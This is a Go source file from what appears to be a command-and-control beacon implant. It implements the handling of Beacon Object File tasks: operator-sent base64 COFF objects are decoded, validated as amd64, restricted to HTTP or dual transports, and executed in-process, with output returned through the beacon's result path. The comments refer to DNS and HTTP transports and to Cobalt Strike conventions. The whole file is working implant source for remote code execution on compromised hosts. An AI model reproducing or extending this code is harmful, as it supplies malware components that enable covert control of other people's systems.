package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
)

// BOF (Beacon Object File) support.
//
// The task format is deliberately the same shape as update_transport: a prefixed
// JSON document, so it travels the existing string-based task pipeline unchanged.
//
//	bof:{"name":"whoami.o","args":"-v","data":"<base64 COFF>"}
//
// A BOF is delivered to the beacon and executed in-process. That only makes sense
// over HTTP: a DNS-carried task is chunked into 400-byte labels, so shipping an
// object file that way is slow, noisy and pointless. The beacon therefore refuses
// a BOF task unless its active transport is http or dual - the operator may have
// switched a build-time HTTP beacon back to DNS at runtime.
const (
	bofCommandPrefix = "bof:"

	// maxBOFPayloadBytes bounds the decoded object file. The beacon reads an HTTP
	// response body up to max_body_bytes (1 MiB by default) and base64 costs 4/3,
	// so 512 KiB decoded still fits a default profile with room for the envelope.
	// Real BOFs are usually 5-50 KiB.
	maxBOFPayloadBytes = 512 * 1024

	coffMachineAMD64 = 0x8664
	coffMachineARM64 = 0xAA64
)

// bofTask is the decoded task document.
type bofTask struct {
	Name string `json:"name"`
	Args string `json:"args"`
	Data string `json:"data"`
}

// bofRequest is a validated BOF ready to execute.
type bofRequest struct {
	Name   string
	Args   string
	ArgsCB []byte // NUL-terminated args buffer the object receives
	Object []byte
}

func isBOFCommand(command string) bool {
	return strings.HasPrefix(command, bofCommandPrefix)
}

// handleBOFCommand validates and runs a BOF task, returning the text result that
// goes back through the normal result path.
func (b *Beacon) handleBOFCommand(payload string) string {
	mode := transportDNS
	if b.transport != nil {
		mode = b.transport.Mode()
	}
	if mode != transportHTTP && mode != transportDual {
		return fmt.Sprintf("BOF refused: beacon transport is %q; BOFs are only executed on HTTP or dual beacons", mode)
	}

	request, err := parseBOFTask(payload)
	if err != nil {
		return "BOF rejected: " + err.Error()
	}

	output, err := executeBOF(request)
	if err != nil {
		// The object's own output is worth keeping: a BOF that fails halfway has
		// usually printed something useful before it did.
		if strings.TrimSpace(output) != "" {
			return output + "\nBOF failed: " + err.Error()
		}
		return "BOF failed: " + err.Error()
	}
	if strings.TrimSpace(output) == "" {
		return fmt.Sprintf("BOF %s completed with no output", request.Name)
	}
	return output
}

// parseBOFTask decodes the JSON envelope, the base64 payload and checks that the
// object is a COFF file this build can load. It does no execution.
func parseBOFTask(payload string) (bofRequest, error) {
	var task bofTask
	if err := json.Unmarshal([]byte(payload), &task); err != nil {
		return bofRequest{}, fmt.Errorf("malformed task document: %v", err)
	}
	if task.Data == "" {
		return bofRequest{}, fmt.Errorf("task carries no object file")
	}

	object, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		return bofRequest{}, fmt.Errorf("object is not valid base64: %v", err)
	}
	if len(object) > maxBOFPayloadBytes {
		return bofRequest{}, fmt.Errorf("object is %d bytes, over the %d byte limit", len(object), maxBOFPayloadBytes)
	}
	if err := validateCOFF(object); err != nil {
		return bofRequest{}, err
	}

	name := task.Name
	if name == "" {
		name = "unnamed.bof"
	}

	// The object's entry point takes (char *args, int len). Cobalt Strike hands a
	// NUL-terminated buffer, and BOFs commonly walk it as a string, so keep the
	// terminator even though the length is passed separately.
	argsCB := append([]byte(task.Args), 0)

	return bofRequest{Name: name, Args: task.Args, ArgsCB: argsCB, Object: object}, nil
}

// validateCOFF checks the file is a COFF object this loader can handle.
func validateCOFF(object []byte) error {
	if len(object) < 20 {
		return fmt.Errorf("object is %d bytes, too short to be a COFF file", len(object))
	}
	machine := binary.LittleEndian.Uint16(object[0:2])
	switch machine {
	case coffMachineAMD64:
		return nil
	case coffMachineARM64:
		return fmt.Errorf("object targets arm64; this beacon loads amd64 objects only")
	default:
		return fmt.Errorf("object machine 0x%04x is not a COFF x86-64 object", machine)
	}
}
